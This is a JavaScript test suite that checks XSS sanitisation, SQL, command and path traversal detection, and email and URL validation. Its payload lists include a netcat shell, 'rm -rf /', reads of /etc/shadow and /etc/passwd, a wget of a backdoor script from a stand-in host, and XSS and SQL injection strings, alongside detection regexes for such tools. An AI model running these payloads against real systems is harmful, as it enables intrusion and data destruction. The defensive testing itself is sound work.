/**
 * Security Test Suite: Input Validation and Sanitization
 * OWASP Compliance: Input Validation Testing
 */

const { expect } = require('chai');
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const validator = require('validator');

// Setup JSDOM for DOMPurify
const window = new JSDOM('').window;
const purify = DOMPurify(window);

describe('Input Validation and Sanitization Security Tests', () => {

  describe('HTML/Script Injection Prevention', () => {
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      '<form><button formaction=javascript:alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '"><svg/onload=alert(/XSS/)>',
      '<img src="" onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">'
    ];

    maliciousInputs.forEach((input, index) => {
      it(`should sanitize malicious input ${index + 1}: ${input.substring(0, 50)}...`, () => {
        const sanitized = purify.sanitize(input);

        // Ensure no script tags remain
        expect(sanitized).to.not.include('<script>');
        expect(sanitized).to.not.include('javascript:');
        expect(sanitized).to.not.include('onerror=');
        expect(sanitized).to.not.include('onload=');
        expect(sanitized).to.not.include('alert(');

        // Log for security audit
        console.log(`Input: ${input} -> Sanitized: ${sanitized}`);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "admin';--",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' UNION SELECT * FROM users --",
      "' OR 1=1 --",
      "'; INSERT INTO users (username) VALUES ('hacker'); --",
      "1'; UPDATE users SET password='hacked' WHERE id=1; --",
      "'; DELETE FROM users; --"
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should detect SQL injection attempt ${index + 1}`, () => {
        // Simulate SQL injection detection
        const containsSqlKeywords = /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC|OR|AND|WHERE)\b)/i.test(payload);
        const containsSqlChars = /[';--]/.test(payload);

        expect(containsSqlKeywords || containsSqlChars).to.be.true;

        // In real implementation, this would be blocked
        console.log(`SQL Injection detected: ${payload}`);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "& rm -rf /",
      "`whoami`",
      "$(cat /etc/shadow)",
      "; curl malicious-site.com",
      "| nc -l -p 4444 -e /bin/sh",
      "; wget http://malicious.com/backdoor.sh",
      "& echo 'hacked' > /tmp/pwned",
      "; python -c 'import os; os.system(\"rm -rf /\")'",
      "| base64 -d <<< 'Y3VybCBtYWxpY2lvdXMuY29t' | sh",
      "; eval(base64_decode('malicious_code'))"
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should detect command injection attempt ${index + 1}`, () => {
        // Check for dangerous command characters
        const dangerousChars = /[;|&`$(){}[\]]/;
        const containsDangerousChars = dangerousChars.test(payload);

        // Check for dangerous commands
        const dangerousCommands = /(rm|cat|ls|curl|wget|nc|python|eval|exec|system)/i;
        const containsDangerousCommands = dangerousCommands.test(payload);

        expect(containsDangerousChars || containsDangerousCommands).to.be.true;

        console.log(`Command injection detected: ${payload}`);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "/var/www/../../etc/passwd",
      "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should detect path traversal attempt ${index + 1}`, () => {
        // Check for directory traversal patterns
        const traversalPattern = /(\.\.|%2e%2e|%252e|%c0%af)/i;
        const containsTraversal = traversalPattern.test(payload);

        expect(containsTraversal).to.be.true;

        console.log(`Path traversal detected: ${payload}`);
      });
    });
  });

  describe('Email Validation', () => {
    const validEmails = [
      'user@example.com',
      'test.email@domain.co.uk',
      'user+tag@example.org'
    ];

    const invalidEmails = [
      'invalid-email',
      '@domain.com',
      'user@',
      'user@domain',
      'user..double.dot@domain.com',
      '<script>alert("xss")</script>@domain.com'
    ];

    validEmails.forEach(email => {
      it(`should validate correct email: ${email}`, () => {
        expect(validator.isEmail(email)).to.be.true;
      });
    });

    invalidEmails.forEach(email => {
      it(`should reject invalid email: ${email}`, () => {
        expect(validator.isEmail(email)).to.be.false;
      });
    });
  });

  describe('URL Validation', () => {
    const validUrls = [
      'https://example.com',
      'http://localhost:3000',
      'https://sub.domain.com/path'
    ];

    const maliciousUrls = [
      'javascript:alert("xss")',
      'data:text/html,<script>alert("xss")</script>',
      'ftp://malicious.com/backdoor',
      'file:///etc/passwd',
      'vbscript:msgbox("xss")'
    ];

    validUrls.forEach(url => {
      it(`should validate safe URL: ${url}`, () => {
        expect(validator.isURL(url, { protocols: ['http', 'https'] })).to.be.true;
      });
    });

    maliciousUrls.forEach(url => {
      it(`should reject malicious URL: ${url}`, () => {
        const isSafe = validator.isURL(url, { protocols: ['http', 'https'] });
        expect(isSafe).to.be.false;
      });
    });
  });

  describe('Input Length Validation', () => {
    it('should reject excessively long inputs (DoS prevention)', () => {
      const longInput = 'A'.repeat(10000000); // 10MB string
      const maxLength = 1000000; // 1MB limit

      expect(longInput.length > maxLength).to.be.true;
      console.log(`Long input detected: ${longInput.length} characters (limit: ${maxLength})`);
    });

    it('should handle Unicode normalization attacks', () => {
      const unicodeAttack = '\u0041\u0301'; // Á using combining characters
      const normalized = unicodeAttack.normalize('NFC');

      expect(normalized).to.not.equal(unicodeAttack);
      console.log(`Unicode normalization: "${unicodeAttack}" -> "${normalized}"`);
    });
  });
});